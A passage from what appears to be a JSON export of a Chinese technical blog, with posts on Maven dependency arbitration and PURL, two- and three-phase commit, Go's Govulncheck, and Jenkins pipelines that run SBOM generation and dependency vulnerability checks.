write-ups\nCNCFtag-security&#x2F;supply-chain-security&#x2F;supply-chain-security-paper at main · cncf&#x2F;tag-security · GitHub\n","slug":"github的软件供应链安全能力","date":"2022-09-23T05:36:00.000Z","categories_index":"软件供应链安全","tags_index":"软件供应链安全,Github,Gitlab,Dependabot,Dependency-scanning","author_index":"Moses"},{"id":"e2099bf2ebd049ea8a6831d6aadccb72","title":"软件成分分析-Maven工作机制","content":"Maven间接依赖场景的冲裁机制BackendSSO统一权限父子项目中POM引用未规范，子工程POM引用了encrypt-body-spring-boot-starter-1.2.3.jar导致DT未检测出子项目的软件成分。\nConcept坐标是什么？在空间坐标系中，我们可以通过xyz表示一个点，同样在Maven的世界里，我们可以通过一组GAV在依赖的世界里明确表示一个依赖，比如：\n&lt;groupId&gt; : com.alibaba 一般是公司的名称\n\n&lt;artifactId&gt; : fastjson 项目名称\n\n&lt;version&gt; : 1.2.24 版本号\n什么是PURLPURL(Package URL)用于定位一个产品或组件，见GitHub - package-url&#x2F;purl-spec: A minimal specification for purl aka. a package “mostly universal” URL, join the discussion at https://gitter.im/package-url/LobbyPURL由以下7个部分组成scheme:type/namespace/name@version?qualifiers#subpath\n\nscheme: this is the URL scheme with the constant value of “pkg”. One of the primary reason for this single scheme is to facilitate the future official registration of the “pkg” scheme for package URLs. Required.\ntype: the package “type” or package “protocol” such as maven, npm, nuget, gem, pypi, etc. Required.\nnamespace: some name prefix such as a Maven groupid, a Docker image owner, a GitHub user or organization. Optional and type-specific.\nname: the name of the package. Required.\nversion: the version of the package. Optional.\nqualifiers: extra qualifying data for a package such as an OS, architecture, a distro, etc. Optional and type-specific.\nsubpath: extra subpath within a package, relative to the package root. Optional.\n\nexample# bitbucket\npkg:bitbucket&#x2F;birkenfeld&#x2F;pygments-main@244fd47e07d1014f0aed9c\n# docker \npkg:docker&#x2F;cassandra@sha256:244fd47e07d1004f0aed9c\n# maven \npkg:maven&#x2F;org.apache.xmlgraphics&#x2F;batik-anim@1.9.1?packaging&#x3D;sources\n# rpm\npkg:rpm&#x2F;fedora&#x2F;curl@7.50.3-1.fc25?arch&#x3D;i386&amp;distro&#x3D;fedora-25\n# npm\npkg:npm&#x2F;%40angular&#x2F;animation@12.3.1\n依赖的标签 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;\n\txsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;\n\t&lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;\n\n\t&lt;groupId&gt;com.demo.springcloud&lt;&#x2F;groupId&gt;\n\t&lt;artifactId&gt;biz-service-0&lt;&#x2F;artifactId&gt;\n\t&lt;version&gt;1.0.0&lt;&#x2F;version&gt;\n\t&lt;packaging&gt;jar&lt;&#x2F;packaging&gt;\n\n\t&lt;name&gt;biz-service-0&lt;&#x2F;name&gt;\n\t&lt;description&gt;Spring Cloud project&lt;&#x2F;description&gt;\n\n\t&lt;parent&gt;\n\t\t&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;\n\t\t&lt;version&gt;1.4.3.RELEASE&lt;&#x2F;version&gt;\n\t\t&lt;relativePath&#x2F;&gt; \n\t&lt;&#x2F;parent&gt;\n\n\t&lt;properties&gt;\n\t\t&lt;project.build.sourceEncoding&gt;UTF-8&lt;&#x2F;project.build.sourceEncoding&gt;\n\t\t&lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;\n\t&lt;&#x2F;properties&gt;\n\n\t&lt;dependencies&gt;\n\t\t&lt;dependency&gt;\n\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;\n\t\t\t&lt;artifactId&gt;spring-cloud-starter-eureka&lt;&#x2F;artifactId&gt;\n\t\t&lt;&#x2F;dependency&gt;\n\n\t\t&lt;dependency&gt;\n\t\t\t&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n\t\t\t&lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;\n\t\t\t&lt;scope&gt;test&lt;&#x2F;scope&gt;\n\t\t&lt;&#x2F;dependency&gt;\n\t&lt;&#x2F;dependencies&gt;\n\n\t&lt;dependencyManagement&gt;\n\t\t&lt;dependencies&gt;\n\t\t\t&lt;dependency&gt;\n\t\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;\n\t\t\t\t&lt;artifactId&gt;spring-cloud-dependencies&lt;&#x2F;artifactId&gt;\n\t\t\t\t&lt;version&gt;Brixton.RELEASE&lt;&#x2F;version&gt;\n\t\t\t\t&lt;type&gt;pom&lt;&#x2F;type&gt;\n\t\t\t\t&lt;scope&gt;import&lt;&#x2F;scope&gt;\n\t\t\t&lt;&#x2F;dependency&gt;\n\t\t&lt;&#x2F;dependencies&gt;\n\t&lt;&#x2F;dependencyManagement&gt;\n\n\t&lt;build&gt;\n\t\t&lt;plugins&gt;\n\t\t\t&lt;plugin&gt;\n\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;\n\t\t\t&lt;&#x2F;plugin&gt;\n\t\t&lt;&#x2F;plugins&gt;\n\t&lt;&#x2F;build&gt;\n\n&lt;&#x2F;project&gt;\n\n1.dependencies \n直接引入具体的依赖信息。注意是不在dependencyManagement标签内的情况。如果是在dependencyManagement内的情况，请参考2号标签。\n2.dependencyManagement 只声明但不发生实际引入，作为依赖管理。依赖管理是指真正发生依赖的时候，再去参考依赖管理的数据。这样使用dependency的时候，可以缺省version。另外dependencyManagement还可以管控所有的间接依赖，即使间接依赖声明了version，也要被覆盖掉。   \n3.parent声明自己的父亲，Maven的继承哲学跟Java很类似，因为Maven本身也是用Java实现的，满足单继承。\n\n一旦子pom继承了父pom，那么会把父pom里的 &lt;dependencies&gt; ，&lt;dependencyManagement&gt;等等属性都继承过来的。当然如果在继承的过程中，出现一样的元素，也是子去覆盖父亲，和Java类似。\n\n继承时，会分类继承。dependencies继承dependencies，dependencyManagement里的依赖管理只能继承dependencyManagement范围内的依赖管理。\n\n每一个pom文件都会有一个父亲，即使不声明Parent，也会默认有一个父亲。和Java的Object设计哲学类似。后面在源码分析中我们还会提到。\n\n\n4.properties\n代表当前自己的项目的一个属性的集合。 properties仅仅代表属性的声明，一个属性声明了，和他是否被引用并无关系。我完全可以声明一系列不被人使用的属性。\n依赖的作用域一个依赖在引入的时候，是可以声明这个依赖的作用范围的。比如这个依赖只对本地起作用，比如只对测试起作用等等。作用域一共有compile，provided，system，test，import，runtime 这几个值。\n\ncompile和runtime会参与最后的打包环节，其余的都不会。compile可以不写。\n\ntest只会对 src&#x2F;test目录下的测试代码起作用。\n\nprovided是指线上已经提供了这个Jar包，打包的时候不需要在考虑他了，一般像serlvet的包很多都是provided。\n\nsystem和provided没什么太大的区别。\n\nimport只会出现在dependencyManagement标签内的依赖中，是为了解决Maven的单继承。引入了这个作用域的话，maven会把此依赖的所有的dependencyManagement内的元素加载到当前pom中的，但不会引入当前节点。如下图，并不会引入fastjson作为依赖管理的元素，只是会把fastjson文件定义的依赖管理引入进来。\n\n\n单个树的依赖竞争POM的本质一个Pom文件的本质就是一棵树。在人的视角来观察一个Pom文件的时候，我们会认为他是一个线状的一个依赖列表，我们会认为下图的Pom文件抽象出来的结果是C依赖了A,B,D。但我们的视角是不完备的，Maven的视角来看，Maven会把这一个Pom文件直接抽象成一个依赖树。Maven的视角能看到除了ABD之外的节点。而人只能看到ABD三个节点。既然是在一棵树上，那么相同的节点就必然会存在竞争关系。这个竞争关系就是我们提到了仲裁机制。\nMaven的冲裁机制原则1.依赖竞争时，越靠近主干的越优先。\n2.单颗树在依赖在竞争时(dependencies)（注意：不是dependencyManagement里的dependencies）：\n\n当deep&#x3D;1，即直接依赖。同级是靠后优先。\n\n当deep&gt;1，即间接依赖。同级是靠前优先。\n\n\n3.单颗树在依赖管理在竞争时(注意：是dependencyManagement里的dependencies)是靠前优先的。\n4.maven里最重要的2个关系，分别是继承关系和依赖关系。我们所有的规律都应该只从这2个关系入手。\n下图中分别是2个子pom文件（方块代表依赖的节点，A-1 表示A这个节点使用的是1版本，字母代表节点，数字代表版本）。左边这个子pom生成的树依赖了 D-1，D-2和D-5。满足依赖竞争原则1，即越靠近树的左侧越优先的原则，所以D-5会竞争成功\n但是B-1和B-2同时都位于树的同一深度，并且深度为1，由于B-2更加靠后，所以B-2会竞争成功。\n右边的子pom生成的树依赖了 D-1和D-2，并且位于同一深度，但由于D-1和D-2是属于间接依赖的范围，deep大于1，所以是靠前优先，那么也就是D-1会竞争成功。\n常见场景Analyzemaven常用命令- mvn clean package -DSkipTest 直接进行打包，进行结果分析- mvn dependency:tree 会把整个的maven的树形结构输出- mvn help:effective-pom -Dverbose 这个命令输出的信息更加完整，输出的是effectivepom- mvn clean org.apache.maven.plugins:maven-dependency-plugin:3.3.0:tree -Dverbose&#x3D;true- mvn -D maven.repo.local &#x3D;你的目录 compile阶段用到的依赖。\nReferences","slug":"Maven间接依赖场景的冲裁机制","date":"2022-09-22T02:42:00.000Z","categories_index":"软件供应链安全","tags_index":"优秀文章收藏,JAVA,软件供应链安全,软件成分分析,Maven依赖","author_index":"Moses"},{"id":"056884aed1b9e83f84ccf54a05d51c85","title":"分布式系统学习-两段式&三段式提交","content":"Two-phase commit定义在分布式系统中，为了让每个节点都能够感知到其他节点的事务执行状况，需要引入一个中心节点来统一处理所有节点的执行逻辑，这个中心节点叫做协调者（Coordinator），被中心节点调度的其他业务节点叫做参与者（Participant）。\n2PC 将分布式事务分成了两个阶段，两个阶段分别为提交请求（投票）和提交（执行）。协调者根据参与者的响应来决定是否需要真正地执行事务，具体流程如下：\n提交请求（投票）阶段\n协调者向所有参与者发送 prepare 请求与事务内容，询问是否可以准备事务提交，并等待参与者的响应。\n\n参与者执行事务中包含的操作，并记录 undo 日志（用于回滚）和 redo 日志（用于重放），但不真正提交。\n\n参与者向协调者返回事务操作的执行结果，执行成功返回 yes，否则返回 no。\n\n\n提交（执行）阶段分为成功与失败两种情况。\n\n若所有参与者都返回 yes，说明事务可以提交：\n协调者向所有参与者发送 Commit 请求。\n参与者收到 Commit 请求后，将事务真正地提交上去，并释放占用的事务资源，并向协调者返回 Ack。\n协调者收到所有参与者的 Ack 消息，事务成功完成。\n\n\n若有参与者返回 no 或者超时未返回，说明事务中断，需要回滚：\n协调者向所有参与者发送 Rollback 请求。\n参与者收到 Rollback 请求后，根据 undo 日志回滚到事务执行前的状态，释放占用的事务资源，并向协调者返回 Ack。\n协调者收到所有参与者的 Ack 消息，事务回滚完成。\n\n\n\n应用flink 2PCFlink 作为流式处理引擎，自然也提供了对 Exactly Once 语义的保证。端到端的 Exactly Once 语义，是输入、处理逻辑、输出三部分协同作用的结果。Flink 内部依托检查点机制和轻量级分布式快照算法 ABS 保证 Exactly Once。而要实现精确一次的输出逻辑，则需要施加以下两种限制之一：幂等性写入（idempotent write）、事务性写入（transactional write）。预提交阶段的流程每当需要做 Checkpoint 时，JobManager 就在数据流中打入一个屏障（barrier），作为检查点的界限。屏障随着算子链向下游传递，每到达一个算子都会触发将状态快照写入状态后端的动作。当屏障到达 Kafka sink 后，通过 KafkaProducer.flush() 方法刷写消息数据，但还未真正提交。接下来还是需要通过检查点来触发提交阶段：提交阶段流程\n只有在所有检查点都成功完成这个前提下，写入才会成功。这符合前文所述 2PC 的流程，其中 JobManager 为协调者，各个算子为参与者（不过只有 Sink 一个参与者会执行提交）。一旦有检查点失败，notifyCheckpointComplete() 方法就不会执行。如果重试也不成功的话，最终会调用 abort() 方法回滚事务。\n2PC的问题同步阻塞问题：二阶段提交算法在执行过程中，所有参与节点都是事务阻塞型的。也就是说，当本地资源管理器占有临界资源时，其他资源管理器如果要访问同一临界资源，会处于阻塞状态。\n协调者单点故障导致参与者长期阻塞问题：基于 XA 的二阶段提交算法类似于集中式算法，一旦事务管理器发生故障，整个系统都处于停滞状态。尤其是在提交阶段，一旦事务管理器发生故障，资源管理器会由于等待管理器的消息，而一直锁定事务资源，导致整个系统被阻塞。\n数据不一致问题：在提交阶段，当协调者向参与者发送 DoCommit 请求之后，如果发生了局部网络异常，或者在发送提交请求的过程中协调者发生了故障，就会导致只有一部分参与者接收到了提交请求并执行提交操作，但其他未接到提交请求的那部分参与者则无法执行事务提交。于是整个分布式系统便出现了数据不一致的问题。\n二阶段无法解决的问题：协调者再发出DoCommit 消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否被已经提交。\n3PC三阶段提交协议（Three-phase commit protocol，3PC），是对二阶段提交（2PC）的改进。为了解决两阶段提交的同步阻塞和数据不一致问题，三阶段提交引入了超时机制和准备阶段。超时机制\n同时在协调者和参与者中引入超时机制。如果协调者或参与者在规定的时间内没有接收到来自其他节点的响应，就会根据当前的状态选择提交或者终止整个事务。\n准备阶段\n在第一阶段和第二阶段中间引入了一个准备阶段，也就是在提交阶段之前，加入了一个预提交阶段。在预提交阶段排除一些不一致的情况，保证在最后提交之前各参与节点的状态是一致的。\nCanCommit 阶段协调者向参与者发送请求操作（CanCommit 请求），询问参与者是否可以执行事务提交操作，然后等待参与者的响应；参与者收到 CanCommit 请求之后，回复 Yes，表示可以顺利执行事务；否则回复 No。（我个人理解类似做TCC中Try操作）PreCommit 阶段\n协调者根据参与者的回复情况，来决定是否可以进行 PreCommit 操作 或 中断事务。\n如果所有参与者回复的都是“Yes”，那么协调者就会执行事务的预执行：\n\n发送预提交请求。协调者向参与者发送 PreCommit 请求，进入预提交阶段。\n事务预提交。参与者接收到 PreCommit 请求后执行事务操作，并将 Undo 和 Redo 信息记录到事务日志中，同时锁定当前记录。\n响应反馈。如果参与者成功执行了事务操作，则返回 ACK 响应，同时开始等待最终指令\n\n如果任何一个参与者向协调者发送了“No”消息，或者等待超时之后，协调者都没有收到参与者的响应，就执行中断事务的操作：\n\n发送中断请求。协调者向所有参与者发送“Abort”消息。\n中断事务。参与者收到“Abort”消息之后，或超时后仍未收到协调者的消息，执行事务的中断操作。DoCommit 阶段\n\n协调者根据参与者的回复情况，来决定是否可以进行 DoCommit 操作 或 中断事务。\n如果所有参与者回复的都是“Yes”，那么协调者就会执行事务的提交：\n\n发送提交请求。协调者接收到所有参与者发送的 Ack 响应，从预提交状态进入到提交状态，并向所有参与者发送 DoCommit 消息。\n事务提交。参与者接收到 DoCommit 消息之后，正式提交事务。完成事务提交之后，释放所有锁住的资源。\n响应反馈。参与者提交完事务之后，向协调者发送 Ack 响应。\n完成事务。协调者接收到所有参与者的 Ack 响应之后，完成事务。\n\n如果任何一个参与者向协调者发送了“No”消息，或者协调者等待超时之后，协调者都没有收到参与者的响应，就执行中断事务的操作：\n\n发送中断请求。协调者向所有参与者发送 Abort 请求。\n事务回滚。参与者接收到 Abort 消息之后，利用其在 PreCommit 阶段记录的 Undo 信息执行事务的回滚操作，并释放所有锁住的资源。\n反馈结果。参与者完成事务回滚之后，向协调者发送 Ack 消息。\n中断事务。协调者接收到参与者反馈的 Ack 消息之后，执行事务的中断，并结束事务。。\n\n当参与者PreCommit 阶段向协调者发送 Ack 消息后，如果长时间没有得到协调者的响应，在默认情况下，参与者会自动将超时的事务进行提交，不会像两阶段提交那样被阻塞住\n\n小结如何解决协调者单点故障导致参与者长期阻塞。由于存在超时机制，即使协调者发生故障，参与者无法及时收到来自协调者的信息之后，他会默认执行commit。避免参与者长期阻塞。\n同步阻塞问题3PC会在2阶段到3阶段间阻塞，2PC会在1阶段到2阶段整个事务过程中阻塞，因而总体来说3PC并不能不阻塞，只是最大限度减少了阻塞的时间。同时安装5.2也能够解决协调者单点故障导致参与者长期阻塞的问题\n数据不一致问题3PC和2PC都无法解决数据一致的问题，不过3PC存在超时会通过超时保证协调者和参与者在提交阶段无法通信过程中最终一致，而不需人工介入。\n","slug":"Two-phase commit","date":"2022-09-15T00:57:00.000Z","categories_index":"分布式","tags_index":"三段式提交,两段式提交,分布式事务,分布式系统","author_index":"Moses"},{"id":"9c3da876af68c4f62cd5f90bc6783fab","title":"软件供应链分析工具-GoLang原生工具","content":"GoLang native sca tool for developer0x01简介2022-09-06，Go 安全团队正式对外宣布Go漏洞管理工具 Govulncheck， Govulncheck 是一款面向开发者的供应链漏洞检测工具，通过分析源代码或编译后的二进制文件，分析项目中引入的三方包及相关函数，然后在漏洞库 https://vuln.go.dev/ 中查询是否是否存在漏洞。\n值得称赞的是， Govulncheck 在三方包的名称和版本进行漏洞匹配的基础上，还分析了三方包中的函数是否被调用，以及相关的调用路径。此外， Govulncheck 还结合了 Go 版本、操作系统的版本和架构做进一步的漏洞筛选，最终只展示在当前操作系统和 Go 语言版本中，具有真实危害的三方包。例如，对于 Linux 平台运行的二进制文件，不会报告具有 Windows 特定依赖条件的三方包漏洞，更详细的内容可以查看官方文档。\n0x02架构图\n0x03核心能力Govulncheck 通过分析二进制文件的符号信息查找出三方包及显式调用的函数，根据三方包和函数查找漏洞库，最终确定三方包是否存在漏洞，因此 Govulncheck 无法检测去除符号表信息的二进制文件。但是，生产环境中运行的 Go 二进制文件基本上都会去除符号表信息，减小体积并提高安全性。这一点也更加印证了 Govulncheck 的核心定位是一款为 Developer 开发的 DevSecOps 工具。 Govulncheck 还有一些其它的不足，比如：只支持 Go 1.18 及以上版本编译的二进制文件，分析二进制文件时无法展示漏洞调用图等，更多的限制信息可以查看官方博客。\n0x04 Theory分析代码原理流程如下：\n\n提取项目中使用到的三方组件和函数信息\n如果执行失败，则判断执行 govulncheck 命令的目录中是否存在 go.mod 和 go.sum 方法，输出相关的错误提示信息\n拉取三方组件相关的漏洞信息（该操作会优先检查本地文件缓存）\n根据三方组件和函数名称与漏洞信息进行匹配\n梳理三方组件函数的调用入口及相关的调用链路\n输出检测结果\n\n\n分析二进制原理整体流程如下：\n\n获取二进制文件的编译信息\n获取二进制文件内Go函数的符号名称，在 Golang 1.18 和 1.19 中，函数的符号名称为 go.func.*，Golang 1.20 中函数的符号名称为 go:func.*\n获取二进制文件中的 pclntab 信息\n获取二进制文件的程序计数器及对应的行号，用于函数、语句、指令的位置\n根据程序计数器和对应的行号，解码为对应的符号表\n遍历符号表中的函数信息，获取函数名称、包名等信息\n拉取项目中使用到的三方包相关的漏洞信息到本地\n根据包名或包名与函数名称进行漏洞匹配\n输出检测结果\n\n0x05Quickstartrequireinstallcheck进阶0x06使用说明0x07应用场景ReferencesGoLang native sca tool for developer | owefsad 的博客Go Vulnerability Management - The Go Programming LanguageGo Security - The Go Programming Language\n","slug":"GoLang native sca tool for developer","date":"2022-09-14T02:13:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,GoLand,软件成分分析工具","author_index":"Moses"},{"id":"832ec458ec0531279eee1cd18e61ce2f","title":"CI/CD 过程中的部分pipeline","content":"DTimport hudson.model.*;\nimport hudson.*\nimport groovy.json.JsonSlurper;\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        &#x2F;&#x2F;maven &#39;maven-apollo&#39;\n        maven maven\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;删除上次构建&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;&#39;&#39;\n                    if [[ $maven &#x3D;&#x3D; &quot;maven-bhb&quot; ]];then\n                        rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository&#x2F;com&#x2F;hcfc&#x2F;*\n                    else\n                        rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*\n                    fi\n                &#39;&#39;&#39;\n\n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;BUILD_ID&#125;-$&#123;projectName&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n                \n            &#125;\n        &#125;\n        \n        stage(&#39;拉取代码&#39;)&#123;\n            steps &#123;\n                echo &#39;代码分支:&#39;+BRANCH\n                echo &#39;代码地址:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n                \n            &#125;\n        &#125;\n\n       \n        stage(&#39;build&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    \n                &#39;&#39;&#39;\n             &#125;\n         &#125;\n         \n        stage(&#39;Generating SBOM with Cyclonedx&#39;) &#123;\n            steps &#123;\n                sh &#39;mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom&#39;\n            &#125;\n        &#125;\n        \n\n         stage(&#39;dependencyTrackPublisher&#39;) &#123;\n             steps &#123;\n                 withCredentials([string(credentialsId: &#39;dt&#39;, variable: &#39;API_KEY&#39;)]) &#123;\n                     dependencyTrackPublisher artifact: &#39;target&#x2F;bom.xml&#39;, projectName: projectName, projectVersion: branch, \\\n                                             autoCreateProjects: true, dependencyTrackApiKey:API_KEY, synchronous: true, \\\n                                             failedNewCritical : 10000, failedNewHigh : 10000, failedNewLow: 10000, failedNewMedium: 10000, \\\n                                             failedTotalCritical : 10000, failedTotalHigh : 10000, failedTotalLow : 10000, failedTotalMedium : 10000,\n                                             unstableNewCritical : 10000, unstableNewHigh : 10000, unstableNewLow : 10000, unstableNewMedium : 10000,\\\n                                             unstableTotalCritical : 10000, unstableTotalHigh : 10000,unstableTotalLow : 10000, unstableTotalMedium : 10000\n                 &#125;\n             &#125;\n         &#125;\n        \n        stage(&#39;安全合规检查&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    def jsonPayload &#x3D; new File(&quot;$WORKSPACE&#x2F;target&#x2F;bom.json&quot;).text\n                    def slurper &#x3D; new JsonSlurper()\n                    def states &#x3D; slurper.parseText(jsonPayload)\n                    def components &#x3D; states.components\n                    def checks &#x3D; [&#39;org.apache.shiro:shiro-spring&#39;:&#39;1.9.1&#39;]\n                    def fail_components &#x3D; &quot;&quot;\n                    for (component in components)&#123;\n                        def dep_name &#x3D; component.group + &quot;:&quot; + component.name\n                        \n                        if (dep_name in checks)&#123;\n                            current_version &#x3D; component.version\n                            \n                            check_version &#x3D; checks.get(dep_name)\n                            String[] current_version_chars &#x3D; current_version.split(&#39;\\\\.&#39;)\n                            String[] check_version_chars &#x3D; check_version.split(&#39;\\\\.&#39;)\n                            \n                            \n                            for(int i&#x3D;0; i&lt;current_version_chars.size(); i++)&#123;\n                                curr &#x3D; Integer.parseInt(current_version_chars[i])\n                                check &#x3D; Integer.parseInt(check_version_chars[i])\n                                if (curr &lt; check)&#123;\n                                    fail_components +&#x3D; component.group + &quot;:&quot; + component.name + &quot;版本过低，当前版本为：&quot; + component.version + &quot;，应不低于&quot; + check_version + &quot;\\n&quot;\n                                    break\n                                &#125;\n                            &#125;\n                        &#125;\n                        \n                    &#125;\n                    if(fail_components !&#x3D; &quot;&quot;)&#123;\n                        println(fail_components)\n                        mvn dependency:tree\n                        error &quot;安全合规检查失败，请升级版本！！！&quot;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n    &#125;\n\n&#125;\n\nDCimport hudson.model.*;\nimport hudson.*\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        maven &#39;maven-apollo&#39;\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n    \n    stages &#123;\n        stage(&#39;删除上次构建&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*&#39;\n\n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;service_name&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;拉取代码&#39;)&#123;\n            steps &#123;\n                echo &#39;代码分支:&#39;+BRANCH\n                echo &#39;代码地址:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n           \n            &#125;\n        &#125;\n        \n        stage(&#39;build&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    \n                &#39;&#39;&#39;\n            &#125;\n        &#125;\n        \n        \n        stage(&#39;Dependency-Check 分析&#39;)&#123;\n            steps &#123;\n               sh &#39;&#39;&#39;\n               alias dependency-check&#x3D;&#39;sh &#x2F;data&#x2F;dependency-check&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh&#39;\n\n               dependency-check -n -s $&#123;WORKSPACE&#125;&#x2F; --format HTML --format XML  -o .&#x2F; \n               &#39;&#39;&#39;\n           \n            &#125;\n        &#125;\n        \n        stage(&#39;发布 Dependency-Check 结果&#39;)&#123;\n            steps &#123;\n               dependencyCheckPublisher pattern: &#39;dependency-check-report.xml&#39;\n           \n            &#125;\n        &#125;\n        \n        stage(&#39;发布HTML&#39;)&#123;\n            steps &#123;\n               publishHTML (target : [allowMissing: false,\n               alwaysLinkToLastBuild: false,\n               keepAll: true,\n               reportDir: workspace,\n               reportFiles: &#39;dependency-check-report.html&#39;,\n               reportName: &#39;依赖检测报告&#39;,\n               reportTitles: &#39;OWASP Report&#39;])\n           \n            &#125;\n        &#125;\n        \n    &#125;\n\n&#125;\n\nmaven buildimport hudson.model.*;\nimport hudson.*\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        maven &#39;maven-apollo&#39;\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;删除上次构建&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*&#39;\n                &#x2F;&#x2F; sh &#39;docker images&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;BUILD_ID&#125;-$&#123;service_name&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;拉取代码&#39;)&#123;\n            steps &#123;\n                echo &#39;代码分支:&#39;+BRANCH\n                echo &#39;代码地址:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n              \n            &#125;\n        &#125;\n\n        stage(&#39;yml文件校验&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    if (!service_name.contains(&quot;apollo&quot;))&#123;\n                        sh &#39;&#39;&#39;\n                           \n                            isExist&#x3D;&#96;find . -name application-*.yml&#96;\n                            if [ -z $isExist ]; then\n                                echo &quot;yml文件校验通过&quot;\n                            else\n                                echo &quot;yml文件校验不通过，存在命名为 $isExist 的文件，可能会引起生产问题，请联系开发删除&quot;\n                                exit 2\n                            fi\n                            &#39;&#39;&#39;\n                    &#125;\n                &#125;\n                \n            &#125;            \n        &#125;\n\n        \n        stage(&#39;验证 DOCKER_IMAGE 长度&#39;)&#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    if [[ $&#123;#DOCKER_IMAGE&#125; -gt 28 ]];then\n                        echo &quot;镜像名称长度不能超过28！！！！修改后再来吧！&quot;\n                        exit 2\n                    fi\n                    &#39;&#39;&#39;\n            &#125;\n        &#125;\n        \n        stage(&#39;apollo配置校验&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    sh &#39;&#39;&#39;\n                        updatedb\n                        bootstrapList&#x3D;&#96;locate bootstrap | grep $WORKSPACE&#39;&#x2F;&#39;&#96;\n                        for bootstrap in $bootstrapList\n                            do\n                                cat $bootstrap | while read line\n                                    do\n                                        echo $line\n                                        str&#x3D;$&#123;line##*( )&#125;\n                                        echo $str\n                                        if [[ $str &#x3D;&#x3D; config-service* ]];then\n                                            echo &quot;$bootstrap 文件检查失败，请将apollo.configservice修改为apollo.meta!!! &quot;\n                                            exit 2\n                                        fi\n\n                                    done\n                            done\n                    &#39;&#39;&#39;\n                &#125;\n                \n            &#125;            \n        &#125;\n        \n        \n        stage(&#39;Dockerfile镜像源检查&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    if [[ $POM_PATH 